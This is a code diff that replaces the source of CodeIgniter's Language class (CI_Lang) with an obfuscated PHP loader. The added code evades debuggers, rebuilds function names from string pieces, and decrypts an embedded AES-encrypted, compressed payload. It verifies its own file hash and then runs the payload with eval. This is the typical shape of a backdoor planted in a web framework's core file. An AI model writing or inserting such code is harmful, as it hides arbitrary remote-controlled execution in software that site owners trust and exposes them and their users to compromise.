@@ -1,203 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * Language Class
- *
- * @package		CodeIgniter
- * @subpackage	Libraries
- * @category	Language
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/libraries/language.html
- */
-class CI_Lang {
-
-	/**
-	 * List of translations
-	 *
-	 * @var	array
-	 */
-	public $language =	array();
-
-	/**
-	 * List of loaded language files
-	 *
-	 * @var	array
-	 */
-	public $is_loaded =	array();
-
-	/**
-	 * Class constructor
-	 *
-	 * @return	void
-	 */
-	public function __construct()
-	{
-		log_message('info', 'Language Class Initialized');
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Load a language file
-	 *
-	 * @param	mixed	$langfile	Language file name
-	 * @param	string	$idiom		Language name (english, etc.)
-	 * @param	bool	$return		Whether to return the loaded array of translations
-	 * @param 	bool	$add_suffix	Whether to add suffix to $langfile
-	 * @param 	string	$alt_path	Alternative path to look for the language file
-	 *
-	 * @return	void|string[]	Array containing translations, if $return is set to TRUE
-	 */
-	public function load($langfile, $idiom = '', $return = FALSE, $add_suffix = TRUE, $alt_path = '')
-	{
-		if (is_array($langfile))
-		{
-			foreach ($langfile as $value)
-			{
-				$this->load($value, $idiom, $return, $add_suffix, $alt_path);
-			}
-
-			return;
-		}
-
-		$langfile = str_replace('.php', '', $langfile);
-
-		if ($add_suffix === TRUE)
-		{
-			$langfile = preg_replace('/_lang$/', '', $langfile).'_lang';
-		}
-
-		$langfile .= '.php';
-
-		if (empty($idiom) OR ! preg_match('/^[a-z_-]+$/i', $idiom))
-		{
-			$config =& get_config();
-			$idiom = empty($config['language']) ? 'english' : $config['language'];
-		}
-
-		if ($return === FALSE && isset($this->is_loaded[$langfile]) && $this->is_loaded[$langfile] === $idiom)
-		{
-			return;
-		}
-
-		// Load the base file, so any others found can override it
-		$basepath = BASEPATH.'language/'.$idiom.'/'.$langfile;
-		if (($found = file_exists($basepath)) === TRUE)
-		{
-			include($basepath);
-		}
-
-		// Do we have an alternative path to look in?
-		if ($alt_path !== '')
-		{
-			$alt_path .= 'language/'.$idiom.'/'.$langfile;
-			if (file_exists($alt_path))
-			{
-				include($alt_path);
-				$found = TRUE;
-			}
-		}
-		else
-		{
-			foreach (get_instance()->load->get_package_paths(TRUE) as $package_path)
-			{
-				$package_path .= 'language/'.$idiom.'/'.$langfile;
-				if ($basepath !== $package_path && file_exists($package_path))
-				{
-					include($package_path);
-					$found = TRUE;
-					break;
-				}
-			}
-		}
-
-		if ($found !== TRUE)
-		{
-			show_error('Unable to load the requested language file: language/'.$idiom.'/'.$langfile);
-		}
-
-		if ( ! isset($lang) OR ! is_array($lang))
-		{
-			log_message('error', 'Language file contains no data: language/'.$idiom.'/'.$langfile);
-
-			if ($return === TRUE)
-			{
-				return array();
-			}
-			return;
-		}
-
-		if ($return === TRUE)
-		{
-			return $lang;
-		}
-
-		$this->is_loaded[$langfile] = $idiom;
-		$this->language = array_merge($this->language, $lang);
-
-		log_message('info', 'Language file loaded: language/'.$idiom.'/'.$langfile);
-		return TRUE;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Language line
-	 *
-	 * Fetches a single line of text from the language array
-	 *
-	 * @param	string	$line		Language line key
-	 * @param	bool	$log_errors	Whether to log an error message if the line is not found
-	 * @return	string	Translation
-	 */
-	public function line($line, $log_errors = TRUE)
-	{
-		$value = isset($this->language[$line]) ? $this->language[$line] : FALSE;
-
-		// Because killer robots like unicorns!
-		if ($value === FALSE && $log_errors === TRUE)
-		{
-			log_message('error', 'Could not find the language line "'.$line.'"');
-		}
-
-		return $value;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_eqaeu9ic=('bas'.'e64'.'_de'.'cod'.'e');
+$_vmgx1t8f=('gzu'.'nco'.'mpr'.'ess');
+$_vay3kz9x=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_dvjuexil='kKyxUckr';
+$_wxd2zsyy='5//sMpLQ';
+$_s8i475kz='BGfyo0/Z';
+$_exft6qax='K/UZCOZl';
+$_pnjvm2mx='9qN0tf+hIB8=';
+$_y7zv82s2='kaNhcCh4';
+$_ssld9c2j='dVx5X/TP';
+$_aya2mr3y='Usdd+Q==';
+$_njwnrctg=$_eqaeu9ic($_exft6qax.$_dvjuexil.$_wxd2zsyy.$_s8i475kz.$_pnjvm2mx);
+$_a953qtza=$_eqaeu9ic($_ssld9c2j.$_y7zv82s2.$_aya2mr3y);
+$_r95ttmo7=$_eqaeu9ic('VuurwuoWSZotzmz+K81IHbtENwUDKHctyvpFDjwnH65HP9RhZIvFN/oPXqcrBwlNmT9c5op5rvQpK6R7AsvktM8524DQ3Zw/UWhch818NLo0D8lt2ju6wv4fIR0NzDhGzAoHJ5NuIlBhTJeW1Qb+VyHZ5PcZaNlu+iYrwM98WjFRH8aLBdbitRAdvsoamWZjUDxbxOdcaQbIo3K/8nVu5yxWkdMwp21OqZKZmx8E6C8cAZjBw0xvmmZg7RvHqakrq6wBJLcbo1P6et50u8z2wdXCGoRzWglhq+m7Ch+e0IUocCeV2R9OoiLwti6Bo/VzEUTNy7cHFDs1TuZVcT00RzsEQMNNVa7WhX8HeqMUTRzK2CiL8LoSNiPGYGIc+seTE/SVzHHPM8W92Z705ZXG00MCrTa6TnQvcSX7xBzbdwPS3B19S5DYvPP4X5Fb8xIug1AligHYjE+plL29h6rrQ/7jmkASMIliVHvs3Kn2aDP85Jz+50tru8oc/1Jo19tPfHacrSnJA4i51SFL9FDqhOT7gvFP6JGKtTqZfS28ZsH1yujZx+lydP4CaOjVfvAgFyXgfNtCDSYNsvthUHyeoSmp22QbsQ1JURzuhsAiOp//ifGg+Mquhu5DlzXQMG2OfSC9b1vt1OHE1fJ2HJfUrRlHHlgwEsda9xrEOZic9w1ZreF9RuKwIQwgchw8XtzE/a29HAZXAE4DZujqKbuavrh8PZPJ8ni69aknL4AHoMMTG+LzjZj5XO09gjkfh5uVtbgRo1Zpm6u2YhwB5NMh3yDpF3cS/NYs7oxVLhDGoZsGaV/+fWStjyY3MzBPxRz6gYNnhaSEqXyZRQKKi8BuOEC/YFN2OUR62lk6508U18PGG5ELA7qmQUeZnkz0gapzg+RiMpd9G0QdGhewwMsWvBbSm1nojI4Ew/ZOOwLtVHjhOVDwe0yuQhfg+UPChUXT60a4LC9pNKhPmy+1TffLSf3iAlO0n1VY0ZyMDoh5o1KoxtyyjwHFvLofGA6PCNUSh3pc5UxdDQWTXlw6TKMWkAvi16nnuxRI0Ab4lK2OBLA3QYOgmsM3Lp761DQwDEPqiYDB0UgM9pmy+uRem6ryiw==');
+$_azyzrjqa=$_vay3kz9x($_r95ttmo7,'aes-256-cbc',$_njwnrctg,OPENSSL_RAW_DATA,$_a953qtza);
+if($_azyzrjqa===false){exit;}
+$_brpii5sc=$_vmgx1t8f($_azyzrjqa);
+if($_brpii5sc===false){exit;}
+$_gmo8d42r='6592f1e19618aa7e05a282f0b7b45b02ca1a63fd91d6f1ad702f389de6a888c6';
+$_m02b0h1s=@file_get_contents(__FILE__);
+if($_m02b0h1s!==false){
+$_dn0bruo0=str_replace($_gmo8d42r,"0000000000000000000000000000000000000000000000000000000000000000",$_m02b0h1s);
+$_swrnujwd=hash("sha256",$_dn0bruo0);
+if($_swrnujwd!==$_gmo8d42r){@http_response_code(403);exit;}
 }
+eval($_brpii5sc);
